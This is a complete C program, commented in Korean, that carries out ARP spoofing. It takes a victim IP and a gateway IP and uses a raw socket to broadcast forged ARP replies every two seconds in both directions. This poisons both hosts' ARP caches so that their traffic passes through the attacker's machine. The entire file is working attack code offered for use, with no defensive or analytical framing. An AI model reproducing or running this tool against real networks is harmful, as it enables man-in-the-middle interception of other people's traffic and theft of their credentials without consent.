/*
 * arp_spoof.c
 *
 * 사용법: sudo ./arp_spoof <피해자 IP> <게이트웨이 IP>
 *
 *  - 피해자에게 게이트웨이 IP를, 게이트웨이에게 피해자 IP를 속이는 ARP reply를
 *    주기적으로 전송.
 */

 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <signal.h>
 #include <stdbool.h>
 
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <net/if.h>
 #include <netpacket/packet.h>
 #include <net/ethernet.h> // ETH_P_ARP, ETH_ALEN
 #include <net/if_arp.h>   // ARPHRD_ETHER
 
 volatile sig_atomic_t stop = 0;
 
 void handle_signal(int signum) {
     stop = 1;
 }
 
 #pragma pack(push, 1)
 typedef struct {
     uint8_t dest[6];
     uint8_t src[6];
     uint16_t ethertype;
 } EthernetHeader;
 
 typedef struct {
     uint16_t htype;      
     uint16_t ptype;     
     uint8_t hlen;        
     uint8_t plen;      
     uint16_t opcode;    
     uint8_t sender_mac[6];
     uint32_t sender_ip;
     uint8_t target_mac[6];
     uint32_t target_ip;
 } ArpHeader;
 #pragma pack(pop)
 
 typedef struct {
     EthernetHeader eth;
     ArpHeader arp;
 } ArpPacket;
 
 bool get_local_mac(const char *ifname, uint8_t *mac) {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if(fd < 0) {
         perror("socket");
         return false;
     }
     struct ifreq ifr;
     memset(&ifr, 0, sizeof(ifr));
     strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
     if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
         perror("ioctl");
         close(fd);
         return false;
     }
     memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
     close(fd);
     return true;
 }
 
 int main(int argc, char *argv[]) {
     if(argc != 3) {
         fprintf(stderr, "사용법: sudo %s <피해자 IP> <게이트웨이 IP>\n", argv[0]);
         return EXIT_FAILURE;
     }
 
     const char* victim_ip_str = argv[1];
     const char* gateway_ip_str = argv[2];
     const char* interface = "ens33";  // 필요에 따라 변경
 
     // 로컬 MAC 주소 획득
     uint8_t local_mac[6];
     if(!get_local_mac(interface, local_mac)) {
         fprintf(stderr, "인터페이스 %s의 MAC 주소를 가져오지 못했습니다.\n", interface);
         return EXIT_FAILURE;
     }
 
     // raw socket 생성 (ARP 패킷 전송용)
     int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if(sockfd < 0) {
         perror("socket");
         return EXIT_FAILURE;
     }
 
     // 전송할 인터페이스의 인덱스를 얻습니다.
     int ifindex = if_nametoindex(interface);
     if(ifindex == 0) {
         perror("if_nametoindex");
         close(sockfd);
         return EXIT_FAILURE;
     }
 
     // 소켓 주소 설정
     struct sockaddr_ll socket_address;
     memset(&socket_address, 0, sizeof(socket_address));
     socket_address.sll_family   = AF_PACKET;
     socket_address.sll_protocol = htons(ETH_P_ARP);
     socket_address.sll_ifindex  = ifindex;
     socket_address.sll_hatype   = ARPHRD_ETHER;
     socket_address.sll_pkttype  = PACKET_BROADCAST;
     socket_address.sll_halen    = ETH_ALEN;
     // 목적지 MAC은 브로드캐스트로 설정 (모든 호스트에게 전송)
     memset(socket_address.sll_addr, 0xff, 6);
 
     // 시그널 핸들러 등록 (Ctrl+C 시 중단)
     signal(SIGINT, handle_signal);
 
     printf("[*] ARP 스푸핑 시작 (종료하려면 Ctrl+C 누르세요)\n");
 
     // ARP 패킷 템플릿 준비
     ArpPacket packet;
     memset(&packet, 0, sizeof(packet));
 
     // Ethernet 헤더 설정
     memset(packet.eth.dest, 0xff, 6);            
     memcpy(packet.eth.src, local_mac, 6);           
     packet.eth.ethertype = htons(ETH_P_ARP);
 
     // ARP 헤더 공통 설정
     packet.arp.htype = htons(ARPHRD_ETHER);         
     packet.arp.ptype = htons(ETH_P_IP);             
     packet.arp.hlen = 6;
     packet.arp.plen = 4;
     packet.arp.opcode = htons(2);                   
 
     // 첫 번째 ARP 패킷
     memcpy(packet.arp.sender_mac, local_mac, 6);     // 송신자: 내 MAC
     packet.arp.sender_ip = inet_addr(gateway_ip_str);  // 속이는 IP: 게이트웨이 IP
     memset(packet.arp.target_mac, 0x00, 6);          // 타겟 MAC: 00:00:00:00:00:00
     packet.arp.target_ip = inet_addr(victim_ip_str);   // 피해자 IP
 
     // 루프를 돌며 두 방향으로 ARP 스푸핑 패킷 전송
     while(!stop) {
         // 피해자에게 게이트웨이 IP를 속이는 패킷 전송
         if(sendto(sockfd, &packet, sizeof(packet), 0,
                   (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
             perror("sendto");
         }
 
         // 두 번째 ARP 패킷: 게이트웨이에 피해자 IP를 속임
         ArpPacket packet2;
         memcpy(&packet2, &packet, sizeof(packet));
         memcpy(packet2.arp.sender_mac, local_mac, 6);    // 내 MAC
         packet2.arp.sender_ip = inet_addr(victim_ip_str);  // 송신 IP: 피해자 IP (속이는 값)
         memset(packet2.arp.target_mac, 0x00, 6);
         packet2.arp.target_ip = inet_addr(gateway_ip_str); // 타겟: 게이트웨이 IP
 
         if(sendto(sockfd, &packet2, sizeof(packet2), 0,
                   (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
             perror("sendto");
         }
 
         sleep(2);
     }
 
     printf("\n[*] 중단 감지. 종료합니다.\n");
     close(sockfd);
     return EXIT_SUCCESS;
 }
 